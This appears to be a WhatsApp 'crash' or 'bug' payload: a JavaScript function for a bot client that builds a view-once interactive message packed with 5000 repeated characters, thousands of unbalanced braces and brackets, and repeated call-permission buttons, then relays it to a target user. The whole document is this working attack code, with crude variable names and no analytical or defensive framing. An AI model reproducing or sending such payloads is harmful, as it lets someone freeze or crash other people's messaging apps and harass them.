async function XnXxUi(target) {
const MemekMelar = "ꦾ".repeat(5000);
  const msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "ꈍᴗꈍ",
            hasMediaAttachment: false
          },
          body: {
            text: "\n".repeat(10) + MemekMelar
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(2000) + "[".repeat(1234),
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: MemekMelar
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true })
              },
              {
                name: "call_permission_request",
                buttonParamsJson: MemekMelar
              }
            ]
          }
        }
      }
    }
  };

    await XnXx.relayMessage(target, msg, {
   messageId: null,
    participant: { jid: target }
  });
}